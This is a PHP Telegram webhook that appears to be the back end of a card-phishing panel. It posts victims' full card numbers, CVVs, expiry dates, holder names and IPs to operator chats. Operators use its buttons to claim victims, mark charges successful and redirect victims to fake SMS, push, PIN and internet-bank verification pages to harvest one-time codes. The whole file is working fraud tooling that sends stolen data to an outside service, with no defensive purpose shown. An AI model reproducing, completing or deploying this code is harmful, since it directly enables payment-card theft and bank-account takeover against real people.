<?php
require_once 'config.php';

if (isset($_GET['activate']) && strtolower($_GET['activate']) === 'true') {
    $webhookUrl = rtrim(getBaseUrl(), '/') . '/telegram_webhook.php';
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook";
    $response = sendRequest($url, ['url' => $webhookUrl]);
    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

// Log input for debugging
file_put_contents('webhook.log', date('[Y-m-d H:i:s]')." ".file_get_contents('php://input')."\n", FILE_APPEND);

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    http_response_code(400);
    exit;
}

// Process callback buttons
if (isset($input['callback_query'])) {
    $callback = $input['callback_query'];
    $message = $callback['message'];
    $data = $callback['data'];
    $chatId = $message['chat']['id'];
    $messageId = $message['message_id'];
    $userId = $callback['from']['id'];
    $userName = $callback['from']['first_name'] . ' ' . ($callback['from']['last_name'] ?? '');

    // Handle location button
    if (strpos($data, 'location:') === 0) {
        list($prefix, $sessionId) = explode(':', $data);
        if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
            answerCallback(BOT_TOKEN, $callback['id'], "❌ Invalid session ID");
            exit;
        }
        $sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
        if (!file_exists($sessionFile)) {
            answerCallback(BOT_TOKEN, $callback['id'], "❌ Session not found");
            exit;
        }
        $sessionData = json_decode(file_get_contents($sessionFile), true);
        $pageTitle = $sessionData['current_page'] ?? 'Unknown';
        answerCallback(BOT_TOKEN, $callback['id'], "⚠️ User is on: {$pageTitle}");
        exit;
    }

    // Handle "In Work" assignment button
    if (strpos($data, 'assign:') === 0) {
        list($prefix, $sessionId) = explode(':', $data);
        
        if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
            answerCallback(BOT_TOKEN, $callback['id'], "❌ Invalid session ID");
            exit;
        }
        
        $sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
        if (!file_exists($sessionFile)) {
            answerCallback(BOT_TOKEN, $callback['id'], "❌ Session not found");
            exit;
        }
        
        // Use atomic update to prevent race conditions and get updated session data
        $assignmentBlocked = false;
        $assignedName = null;
        $cardData = null;
        $updatedSessionData = null;
        
        updateSessionData($sessionId, function(&$sessionData) use ($userId, $userName, &$assignmentBlocked, &$assignedName, &$cardData, &$updatedSessionData) {
            $cardData = $sessionData['card_data'] ?? null;
            
            // Check if already assigned to someone else
            $assignedTo = $sessionData['assigned_to'] ?? null;
            if ($assignedTo !== null && (string)$assignedTo !== (string)$userId) {
                $assignedName = $sessionData['assigned_name'] ?? 'Unknown';
                $assignmentBlocked = true;
                return false; // Don't update
            }
            
            // Update session with assignment
            $sessionData['assigned_to'] = (string)$userId;
            $sessionData['assigned_name'] = $userName;
            $sessionData['status'] = 'assigned';
            $sessionData['updated_at'] = time();
            
            // Store updated session data for use after atomic update
            $updatedSessionData = $sessionData;
            
            return true;
        });
        
        if ($assignmentBlocked) {
            answerCallback(BOT_TOKEN, $callback['id'], "❌ Already assigned to {$assignedName}");
            exit;
        }
        
        if (!$cardData || !$updatedSessionData) {
            answerCallback(BOT_TOKEN, $callback['id'], "❌ Session data corrupted");
            exit;
        }
        
        // Use the updated session data from atomic update (includes assigned_to)
        $sessionData = $updatedSessionData;
        $sessionData['session_id'] = $sessionId; // Ensure session_id is set
        
        // Merge presence data for accurate presence line
        $presenceData = readPresenceData($sessionId);
        if ($presenceData) {
            mergePresenceIntoSession($sessionData, $presenceData);
        }
        
        // Update Telegram message with action buttons
        $adminConfig = getAdminConfigFromSession($sessionData);
        $nativeCard = !empty($adminConfig['native_card']);
        $formattedCardNumber = formatCardNumberForTelegram($cardData['number'], $nativeCard);
        
        $messageText = "👤 *Assigned to: $userName*\n\n";
        $messageText .= buildPresenceLine($sessionData) . "\n\n";
        $messageText .= buildInfoLines($cardData, $adminConfig);
        
        $messageText .= "💳 *Card Details*\n";
        $messageText .= "Number: {$formattedCardNumber}\n";
        $messageText .= "Expiry: `{$cardData['expiry']}`\n";
        $messageText .= "CVV: `{$cardData['cvv']}`\n";
        $messageText .= "Holder: `{$cardData['holder']}`\n\n";
        
        if (isset($cardData['card_info']) && !isset($cardData['card_info']['error'])) {
            $cardInfo = $cardData['card_info'];
            $messageText .= "🏦 Bank: `" . ($cardInfo['Issuer'] ?? ($cardInfo['bank']['name'] ?? 'Unknown')) . "`\n";
            $messageText .= "📊 Type: `" . ($cardInfo['CardTier'] ?? ($cardInfo['type'] ?? 'Unknown')) . "`\n";
            $messageText .= "🌍 Country: `" . ($cardInfo['Country']['Name'] ?? ($cardInfo['country']['name'] ?? 'Unknown')) . "`\n";
            $messageText .= "🏛️ Scheme: `" . ($cardInfo['Scheme'] ?? ($cardInfo['scheme'] ?? 'Unknown')) . "`\n\n";
        }
        
        $ipDisplay = getIpDisplayFromSession($sessionData);
        $messageText .= "IP: `{$ipDisplay}`\n";
        $messageText .= buildMetaLines($sessionData);
        $messageText .= "Session: `$sessionId`";

        // Build keyboard with updated session data (includes assigned_to, so no "In Work" button)
        $keyboard = buildActionKeyboard($sessionId, true, $sessionData['current_page'] ?? 'Unknown', $sessionData);

        // Edit message with new keyboard BEFORE answering callback
        editMessage(BOT_TOKEN, $chatId, $messageId, $messageText, $keyboard);
        
        // Store message after edit
        updateSessionData($sessionId, function(&$sessionData) use ($chatId, $messageId, $messageText, $keyboard) {
            storeLastTelegramMessage($sessionData, $chatId, $messageId, $messageText, $keyboard);
            return true;
        });
        
        // Answer callback AFTER message is edited
        answerCallback(BOT_TOKEN, $callback['id'], "✅ You've taken this card");
        exit;
    }
    
    // Handle action buttons
    if (strpos($data, 'action:') === 0) {
        // #region agent log
        $logData = ['callbackData' => $data, 'dataLength' => strlen($data)];
        file_put_contents('d:\botworker\better_pay\.cursor\debug.log', json_encode(['location' => 'telegram_webhook.php:166', 'message' => 'Action button clicked', 'data' => $logData, 'timestamp' => time() * 1000, 'sessionId' => 'debug-session', 'runId' => 'run1', 'hypothesisId' => 'A,C']) . "\n", FILE_APPEND);
        // #endregion
        
        $parts = explode(':', $data);
        // #region agent log
        $logData = ['parts' => $parts, 'partsCount' => count($parts), 'part0' => $parts[0] ?? '', 'part1' => $parts[1] ?? '', 'part2' => $parts[2] ?? ''];
        file_put_contents('d:\botworker\better_pay\.cursor\debug.log', json_encode(['location' => 'telegram_webhook.php:169', 'message' => 'After explode callback_data', 'data' => $logData, 'timestamp' => time() * 1000, 'sessionId' => 'debug-session', 'runId' => 'run1', 'hypothesisId' => 'A,C']) . "\n", FILE_APPEND);
        // #endregion
        
        if (count($parts) < 3) {
            answerCallback(BOT_TOKEN, $callback['id'], "❌ Invalid callback data format");
            exit;
        }
        
        list($prefix, $action, $sessionId) = $parts;
        
        if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
            answerCallback(BOT_TOKEN, $callback['id'], "❌ Invalid session ID");
            exit;
        }
        
        $sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
        if (!file_exists($sessionFile)) {
            answerCallback(BOT_TOKEN, $callback['id'], "❌ Session not found");
            exit;
        }
        
        $sessionData = json_decode(file_get_contents($sessionFile), true);
        $sessionData['session_id'] = $sessionId;
        
        // Auto-assign if not assigned
        $assignedTo = $sessionData['assigned_to'] ?? null;
        if ($assignedTo === null) {
            $sessionData['assigned_to'] = (string)$userId;
            $sessionData['assigned_name'] = $userName;
            $sessionData['updated_at'] = time();
            $assignedTo = $sessionData['assigned_to'];
        }
        
        if ((string)$assignedTo !== (string)$userId) {
            $assignedName = $sessionData['assigned_name'] ?? 'Unknown';
            answerCallback(BOT_TOKEN, $callback['id'], "❌ Assigned to {$assignedName}");
            exit;
        }
        
        // Handle different actions
        if ($action === 'payment_success') {
            // Use atomic update to prevent race conditions
            updateSessionData($sessionId, function(&$sessionData) use ($userName, $chatId, $messageId, $sessionId) {
                $sessionData['status'] = 'completed';
                $sessionData['completed_at'] = time();
                $sessionData['completed_by'] = $userName;
                $sessionData['updated_at'] = time();
                
                // Update root message
                $adminConfig = getAdminConfigFromSession($sessionData);
                $nativeCard = !empty($adminConfig['native_card']);
                $formattedCardNumber = formatCardNumberForTelegram($sessionData['card_data']['number'], $nativeCard);
                $messageText = "✅ *PAYMENT COMPLETED* by $userName\n\n";
                $messageText .= buildPresenceLine($sessionData) . "\n\n";
                $messageText .= buildInfoLines($sessionData['card_data'], $adminConfig);
                $messageText .= "💳 *Card Details*\n";
                $messageText .= "Number: {$formattedCardNumber}\n";
                $messageText .= "Expiry: `{$sessionData['card_data']['expiry']}`\n";
                $messageText .= "CVV: `{$sessionData['card_data']['cvv']}`\n";
                $messageText .= "Holder: `{$sessionData['card_data']['holder']}`\n\n";
                $ipDisplay = getIpDisplayFromSession($sessionData);
                $messageText .= "IP: `{$ipDisplay}`\n";
                $messageText .= buildMetaLines($sessionData);
                $messageText .= "Session: `$sessionId`";
                
                $keyboard = buildActionKeyboard($sessionId, true, $sessionData['current_page'] ?? 'Unknown', $sessionData);
                editMessage(BOT_TOKEN, $chatId, $messageId, $messageText, $keyboard);
                storeLastTelegramMessage($sessionData, $chatId, $messageId, $messageText, $keyboard);
                
                return true;
            });
            
            $triggerFile = SESSIONS_DIR . "/$sessionId.trigger";
            file_put_contents($triggerFile, 'correct');
            
            answerCallback(BOT_TOKEN, $callback['id'], "✅ Payment completed");
            exit;
            
        } elseif ($action === 'payment_failed') {
            // Use atomic update to prevent race conditions
            updateSessionData($sessionId, function(&$sessionData) use ($userName, $chatId, $messageId, $sessionId) {
                $sessionData['status'] = 'failed';
                $sessionData['failed_at'] = time();
                $sessionData['failed_by'] = $userName;
                $sessionData['updated_at'] = time();
                
                $adminConfig = getAdminConfigFromSession($sessionData);
                $nativeCard = !empty($adminConfig['native_card']);
                $formattedCardNumber = formatCardNumberForTelegram($sessionData['card_data']['number'], $nativeCard);
                $messageText = "❌ *PAYMENT FAILED* by $userName\n\n";
                $messageText .= buildPresenceLine($sessionData) . "\n\n";
                $messageText .= buildInfoLines($sessionData['card_data'], $adminConfig);
                $messageText .= "💳 *Card Details*\n";
                $messageText .= "Number: {$formattedCardNumber}\n";
                $messageText .= "Expiry: `{$sessionData['card_data']['expiry']}`\n";
                $messageText .= "CVV: `{$sessionData['card_data']['cvv']}`\n";
                $messageText .= "Holder: `{$sessionData['card_data']['holder']}`\n\n";
                $ipDisplay = getIpDisplayFromSession($sessionData);
                $messageText .= "IP: `{$ipDisplay}`\n";
                $messageText .= buildMetaLines($sessionData);
                $messageText .= "Session: `$sessionId`";
                
                $keyboard = buildActionKeyboard($sessionId, true, $sessionData['current_page'] ?? 'Unknown', $sessionData);
                editMessage(BOT_TOKEN, $chatId, $messageId, $messageText, $keyboard);
                storeLastTelegramMessage($sessionData, $chatId, $messageId, $messageText, $keyboard);
                
                return true;
            });

            $triggerFile = SESSIONS_DIR . "/$sessionId.trigger";
            file_put_contents($triggerFile, 'failed');

            answerCallback(BOT_TOKEN, $callback['id'], "❌ Payment failed");
            exit;
            
        } elseif ($action === 'block') {
            // Use atomic update to prevent race conditions
            updateSessionData($sessionId, function(&$sessionData) use ($userName, $chatId, $messageId, $sessionId) {
                blockCard($sessionData['card_data']['number']);
                
                $sessionData['status'] = 'blocked';
                $sessionData['blocked_at'] = time();
                $sessionData['blocked_by'] = $userName;
                $sessionData['updated_at'] = time();
                
                $adminConfig = getAdminConfigFromSession($sessionData);
                $nativeCard = !empty($adminConfig['native_card']);
                $formattedCardNumber = formatCardNumberForTelegram($sessionData['card_data']['number'], $nativeCard);
                $messageText = "🚫 *CARD BLOCKED* by $userName\n\n";
                $messageText .= buildPresenceLine($sessionData) . "\n\n";
                $messageText .= buildInfoLines($sessionData['card_data'], $adminConfig);
                $messageText .= "💳 *Card Details*\n";
                $messageText .= "Number: {$formattedCardNumber}\n";
                $messageText .= "Expiry: `{$sessionData['card_data']['expiry']}`\n";
                $messageText .= "CVV: `{$sessionData['card_data']['cvv']}`\n";
                $messageText .= "Holder: `{$sessionData['card_data']['holder']}`\n\n";
                $ipDisplay = getIpDisplayFromSession($sessionData);
                $messageText .= "IP: `{$ipDisplay}`\n";
                $messageText .= buildMetaLines($sessionData);
                $messageText .= "Session: `$sessionId`";
                
                $keyboard = buildActionKeyboard($sessionId, true, $sessionData['current_page'] ?? 'Unknown', $sessionData);
                editMessage(BOT_TOKEN, $chatId, $messageId, $messageText, $keyboard);
                storeLastTelegramMessage($sessionData, $chatId, $messageId, $messageText, $keyboard);
                
                return true;
            });
            
            $triggerFile = SESSIONS_DIR . "/$sessionId.action";
            file_put_contents($triggerFile, 'block');
            
            answerCallback(BOT_TOKEN, $callback['id'], "✅ Card blocked");
            exit;
            
        } elseif ($action === 'custom') {
            $customFile = SESSIONS_DIR . "/$sessionId.custom";
            file_put_contents($customFile, "waiting_for_message");
            
            // Use atomic update to prevent race conditions
            updateSessionData($sessionId, function(&$sessionData) use ($action) {
                $sessionData['status'] = $action;
                $sessionData['current_page'] = 'Custom Question';
                $sessionData['updated_at'] = time();
                return true;
            });
            
            $replySessionFile = SESSIONS_DIR . "/reply_$userId.session";
            file_put_contents($replySessionFile, $sessionId);
            
            sendMessageWithReply(BOT_TOKEN, $chatId, 
                "💬 Please reply to this message with the custom question.\n\nSession: `$sessionId`",
                'Markdown',
                $messageId
            );
            
            answerCallback(BOT_TOKEN, $callback['id'], "📝 Reply with your question");
            exit;
            
        } else {
            // SMS, PUSH, PIN, INTERNET_BANK actions
            $actionPageTitles = [
                'sms' => 'SMS Verification',
                'push' => 'Push Verification',
                'pin' => 'PIN Verification',
                'internet_bank' => 'Internet Bank'
            ];
            $sessionData['status'] = $action;
            if (!empty($actionPageTitles[$action])) {
                $sessionData['current_page'] = $actionPageTitles[$action];
            }
            $sessionData['updated_at'] = time();
            
            // Create action trigger file
            $triggerFile = SESSIONS_DIR . "/$sessionId.action";
            file_put_contents($triggerFile, $action);
            
            if ($action === 'push') {
                file_put_contents(SESSIONS_DIR . "/$sessionId.push_sent", '1');
            }
            
            $actionNames = [
                'sms' => 'SMS',
                'push' => 'PUSH', 
                'pin' => 'PIN',
                'internet_bank' => 'Internet Bank'
            ];
            
            $actionName = $actionNames[$action] ?? $action;
            
            // Update root message with new page
            $cardData = $sessionData['card_data'];
            $adminConfig = getAdminConfigFromSession($sessionData);
            $nativeCard = !empty($adminConfig['native_card']);
            $formattedCardNumber = formatCardNumberForTelegram($cardData['number'], $nativeCard);
            $assignedName = $sessionData['assigned_name'] ?? $userName;
            
            $messageText = "👤 *Assigned to: $assignedName*\n";
            $messageText .= "✅ *Redirected to: $actionName*\n\n";
            $messageText .= buildPresenceLine($sessionData) . "\n\n";
            $messageText .= buildInfoLines($cardData, $adminConfig);
            $messageText .= "💳 *Card Details*\n";
            $messageText .= "Number: {$formattedCardNumber}\n";
            $messageText .= "Expiry: `{$cardData['expiry']}`\n";
            $messageText .= "CVV: `{$cardData['cvv']}`\n";
            $messageText .= "Holder: `{$cardData['holder']}`\n\n";
            
            if (isset($cardData['card_info']) && !isset($cardData['card_info']['error'])) {
                $cardInfo = $cardData['card_info'];
                $messageText .= "🏦 Bank: `" . ($cardInfo['Issuer'] ?? ($cardInfo['bank']['name'] ?? 'Unknown')) . "`\n";
                $messageText .= "📊 Type: `" . ($cardInfo['CardTier'] ?? ($cardInfo['type'] ?? 'Unknown')) . "`\n";
                $messageText .= "🌍 Country: `" . ($cardInfo['Country']['Name'] ?? ($cardInfo['country']['name'] ?? 'Unknown')) . "`\n";
                $messageText .= "🏛️ Scheme: `" . ($cardInfo['Scheme'] ?? ($cardInfo['scheme'] ?? 'Unknown')) . "`\n\n";
            }
            
            $ipDisplay = getIpDisplayFromSession($sessionData);
            $messageText .= "IP: `{$ipDisplay}`\n";
            $messageText .= buildMetaLines($sessionData);
            $messageText .= "Session: `$sessionId`";
            
            $keyboard = buildActionKeyboard($sessionId, true, $sessionData['current_page'] ?? 'Unknown', $sessionData);
            editMessage(BOT_TOKEN, $chatId, $messageId, $messageText, $keyboard);
            
            // Use atomic update to store message
            updateSessionData($sessionId, function(&$sessionData) use ($chatId, $messageId, $messageText, $keyboard) {
                storeLastTelegramMessage($sessionData, $chatId, $messageId, $messageText, $keyboard);
                return true;
            });
            
            answerCallback(BOT_TOKEN, $callback['id'], "✅ Redirected to $actionName");
            exit;
        }
    }
    
    // Handle verification incorrect button
    if (strpos($data, 'verify:') === 0) {
        $parts = explode(':', $data);
        if (count($parts) >= 4) {
            $sessionId = $parts[1];
            $type = $parts[2];
            $verdict = $parts[3];
            
            if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
                answerCallback(BOT_TOKEN, $callback['id'], "❌ Invalid session ID");
                exit;
            }
            
            $sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
            if (!file_exists($sessionFile)) {
                answerCallback(BOT_TOKEN, $callback['id'], "❌ Session not found");
                exit;
            }
            
            $sessionData = json_decode(file_get_contents($sessionFile), true);
            $sessionData['session_id'] = $sessionId;
            
            // Handle incorrect - use atomic update to set last_verification_type correctly
            if ($verdict === 'incorrect') {
                $pinAttempts = 0;
                $blockCard = false;
                
                // Use atomic update to prevent race conditions and set last_verification_type
                updateSessionData($sessionId, function(&$sessionData) use ($type, $userName, &$pinAttempts, &$blockCard) {
                    // CRITICAL: Set last_verification_type from callback data to ensure correct redirect
                    $sessionData['last_verification_type'] = $type;
                    
                    $sessionData['verification'] = [
                        'status' => 'rejected',
                        'rejected_at' => time(),
                        'rejected_by' => $userName
                    ];
                    
                    // For PIN, decrement attempts
                    if ($type === 'pin') {
                        if (!isset($sessionData['pin_attempts'])) {
                            $sessionData['pin_attempts'] = 5;
                        }
                        $pinAttempts = max(0, $sessionData['pin_attempts'] - 1);
                        $sessionData['pin_attempts'] = $pinAttempts;
                        
                        if ($pinAttempts <= 0) {
                            $blockCard = true;
                        }
                    }
                    
                    return true;
                });
                
                // Handle PIN blocking outside the atomic update
                if ($type === 'pin' && $blockCard) {
                    $sessionData = readSessionData($sessionId);
                    if ($sessionData && isset($sessionData['card_data']['number'])) {
                        blockCard($sessionData['card_data']['number']);
                    }
                    answerCallback(BOT_TOKEN, $callback['id'], "❌ Rejected - Card blocked (5 failed attempts)");
                } elseif ($type === 'pin') {
                    answerCallback(BOT_TOKEN, $callback['id'], "❌ Rejected - {$pinAttempts} attempts left");
                } else {
                    answerCallback(BOT_TOKEN, $callback['id'], "❌ Rejected - User will retry");
                }
                
                // Create trigger file to redirect user back to verification page
                file_put_contents(SESSIONS_DIR . "/$sessionId.trigger", 'incorrect');
                exit;
            }
        }
    }
    
    // Answer any unhandled callback
    answerCallback(BOT_TOKEN, $callback['id'], "");
    exit;
}

// Handle reply messages for custom actions
if (isset($input['message']['reply_to_message'])) {
    $message = $input['message'];
    $replyTo = $message['reply_to_message'];
    $text = $message['text'] ?? '';
    $chatId = $message['chat']['id'];
    $userId = $message['from']['id'];
    $userName = $message['from']['first_name'] . ' ' . ($message['from']['last_name'] ?? '');
    
    $isCustomRequest = strpos($replyTo['text'] ?? '', 'Please reply to this message with the custom question') !== false;
    
    if (!$isCustomRequest) {
        exit;
    }
    
    $replySessionFile = SESSIONS_DIR . "/reply_$userId.session";
    
    if (file_exists($replySessionFile)) {
        $sessionId = trim(file_get_contents($replySessionFile));
        unlink($replySessionFile);
        
        if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
            sendMessage(BOT_TOKEN, $chatId, "❌ Invalid session ID");
            exit;
        }
        
        $sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
        if (!file_exists($sessionFile)) {
            sendMessage(BOT_TOKEN, $chatId, "❌ Session not found");
            exit;
        }
        
        $sessionData = json_decode(file_get_contents($sessionFile), true);
        $sessionData['session_id'] = $sessionId;
        
        // Auto-assign if not assigned
        $assignedTo = $sessionData['assigned_to'] ?? null;
        if ($assignedTo === null) {
            $sessionData['assigned_to'] = (string)$userId;
            $sessionData['assigned_name'] = $userName;
            $assignedTo = $sessionData['assigned_to'];
        }
        
        if ((string)$assignedTo !== (string)$userId) {
            sendMessage(BOT_TOKEN, $chatId, "❌ You are not assigned to this session");
            exit;
        }
        
        if (empty($text)) {
            sendMessage(BOT_TOKEN, $chatId, "❌ Please provide a custom message text");
            exit;
        }
        
        $customFile = SESSIONS_DIR . "/$sessionId.custom";
        file_put_contents($customFile, $text);
        
        $customMessageFile = SESSIONS_DIR . "/$sessionId.custom_message";
        file_put_contents($customMessageFile, $text);
        
        $sessionData['custom_message'] = $text;
        // Use atomic update to prevent race conditions
        updateSessionData($sessionId, function(&$sessionData) {
            $sessionData['custom_sent_at'] = time();
            $sessionData['updated_at'] = time();
            return true;
        });
        
        sendMessage(BOT_TOKEN, $chatId, 
            "✅ Custom message sent\nSession: `$sessionId`\nMessage: `$text`",
            'Markdown'
        );
        
        $triggerFile = SESSIONS_DIR . "/$sessionId.action";
        file_put_contents($triggerFile, 'custom');
    }
}

http_response_code(200);

function answerCallback($token, $callbackId, $text) {
    $url = "https://api.telegram.org/bot$token/answerCallbackQuery";
    $data = ['callback_query_id' => $callbackId, 'text' => $text];
    return sendRequest($url, $data);
}

function editMessage($token, $chatId, $messageId, $text, $keyboard = null) {
    $url = "https://api.telegram.org/bot$token/editMessageText";
    $data = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $text,
        'parse_mode' => 'Markdown'
    ];
    
    if ($keyboard) {
        $data['reply_markup'] = json_encode($keyboard);
    }
    
    return sendRequest($url, $data);
}

function sendMessage($token, $chatId, $text, $parseMode = null) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $text];
    
    if ($parseMode) {
        $data['parse_mode'] = $parseMode;
    }
    
    return sendRequest($url, $data);
}

function sendMessageWithReply($token, $chatId, $text, $parseMode = null, $replyToMessageId = null) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $text];
    
    if ($parseMode) {
        $data['parse_mode'] = $parseMode;
    }
    
    if ($replyToMessageId) {
        $data['reply_to_message_id'] = $replyToMessageId;
    }
    
    return sendRequest($url, $data);
}

function sendRequest($url, $data) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}
?>
